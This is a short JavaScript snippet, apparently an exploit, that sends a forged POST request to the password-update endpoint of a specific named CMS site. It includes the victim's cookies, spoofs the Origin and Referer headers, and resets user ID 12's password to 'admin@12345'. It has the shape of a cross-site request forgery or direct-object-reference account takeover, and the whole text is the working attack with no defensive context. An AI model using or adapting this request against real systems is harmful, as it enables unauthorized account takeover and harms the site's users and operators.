fetch("https://cms.sipradi.com.np/Setup/Security/UpdateUserPwd", {
    method: "POST",
    headers: {
        "Content-Type": "application/json;charset=UTF-8",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://cms.sipradi.com.np",
        "Referer": "https://cms.sipradi.com.np/Setup/Security/ResetPassword",
    },
    credentials: "include", // Ensures cookies are sent (if allowed)
    body: JSON.stringify({ uId: 12, newPwd: "admin@12345" })
})
.then(response => response.text())
.then(data => console.log("Password changed:", data))
.catch(error => console.error("Error:", error));
